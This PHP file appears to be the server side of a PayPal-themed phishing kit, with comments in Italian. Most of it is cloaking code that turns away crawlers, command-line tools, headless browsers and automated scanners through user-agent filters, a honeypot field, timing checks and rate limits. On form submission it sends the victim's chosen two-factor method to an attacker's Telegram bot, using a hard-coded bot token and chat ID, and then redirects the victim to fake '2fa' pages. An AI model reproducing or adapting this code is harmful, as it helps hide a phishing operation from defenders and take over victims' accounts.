<?php
session_start();

// 1. First Layer - Basic Bot Filter (GET/POST)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    // Block empty User-Agent and basic bots
    if (empty($userAgent) || preg_match('/bot|crawl|spider|curl|wget|python|java|php|ruby|httpclient/i', $userAgent)) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Set temporary verification session
    $_SESSION['verified'] = true;
    $_SESSION['fingerprint'] = md5($_SERVER['HTTP_ACCEPT'] . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $userAgent);
}

// 2. Browser Validation Layer (GET requests only)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Device capability check
    $requiredHeaders = ['HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_USER_AGENT'];
    foreach($requiredHeaders as $h) {
        if(!isset($_SERVER[$h]) || empty($_SERVER[$h])) {
            header("HTTP/1.1 403 Forbidden");
            exit;
        }
    }

    // JS validation token check
    if (!isset($_SERVER['HTTP_SEC_CH_UA']) || 
        !preg_match('/Chromium|Chrome|Safari|Firefox/i', $_SERVER['HTTP_SEC_CH_UA'])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Generate time-limited token for form submission
    if (!isset($_SESSION['form_token'])) {
        $_SESSION['form_token'] = bin2hex(random_bytes(16));
        $_SESSION['form_start'] = time();
    }
}

// 3. Honeypot Trap
if (!empty($_POST['website'])) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}


// 4. Block Headless Browsers
$headlessPattern = '/HeadlessChrome|PhantomJS|QwantBrowser|Puppeteer|Selenium|WebDriver|\\bBot\\b/i';
if (preg_match($headlessPattern, $userAgent)) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 5. Rate Limiting by IP
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$rateLimits = [
    'GET' => ['limit' => 15, 'window' => 300], // Page views
    'POST' => ['limit' => 5, 'window' => 600]  // Form submissions
];

$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];
$method = $_SERVER['REQUEST_METHOD'];
$currentTime = time();

if (!isset($attempts[$ip][$method])) {
    $attempts[$ip][$method] = [
        'count' => 1,
        'first' => $currentTime,
        'last' => $currentTime
    ];
} else {
    $attempts[$ip][$method]['count']++;
    $attempts[$ip][$method]['last'] = $currentTime;
    
    // Reset if window expired
    if ($currentTime - $attempts[$ip][$method]['first'] > $rateLimits[$method]['window']) {
        unset($attempts[$ip][$method]);
    }
}

if ($attempts[$ip][$method]['count'] > $rateLimits[$method]['limit']) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // JS validation check
    if (!isset($_POST['js_token']) || 
        $_POST['js_token'] !== $_SESSION['js_valid']) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }

    // Interaction timing (3-45 seconds)
    $formTime = time() - ($_SESSION['form_start'] ?? 0);
    if ($formTime < 3 || $formTime > 45) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    // Recupera il valore del radio button selezionato
    $selectedOption = $_POST["selectedChallengeType"];

    // Token del bot Telegram e ID del canale
    $botApiToken = '6400179200:AAFLNC22j2zdSxCD83QB70N3zgHyG3AMgiA';
    $channelId = '8105246558';

    // Creazione del messaggio da inviare
    $txt = "📋 Opzione selezionata: {$selectedOption}";

    // Costruzione della query per l'API di Telegram
    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    // URL dell'API di Telegram
    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    // Inizializza cURL per inviare la richiesta HTTP
    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);

    // Esegui la richiesta e chiudi cURL
    $response = curl_exec($curl);
    curl_close($curl);

    // Redirect basato sul valore della checkbox
    switch ($selectedOption) {
        case 'SMS Message':
            header("Location: PP2fa/index.html");
            break;
        case 'whatsapp':
            header("Location: PP2fa/index.html");
            break;
        case 'PayPal App':
            header("Location: App.html");
            break;
        case 'CALL':
            header("Location: index.html");
            break;
        default:
            header("Location: index.html");
            break;
    }
    // Reset rate limiting on successful submission
    if (isset($attempts[$ip])) {
        unset($attempts[$ip]);
        file_put_contents($attemptsFile, json_encode($attempts));
    }
    exit;
}
?>
